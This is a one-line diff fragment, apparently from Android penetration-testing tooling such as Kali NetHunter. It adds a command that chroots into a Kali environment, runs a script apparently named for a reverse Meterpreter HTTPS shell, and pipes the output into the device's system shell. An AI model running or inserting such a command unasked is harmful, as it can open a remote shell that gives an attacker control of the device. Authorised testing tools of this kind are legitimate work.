@@ -1,0 +1,2 @@
+chroot /data/local/kali-armhf/ "/usr/bin/rev-met-https.py"  |/system/bin/sh
+
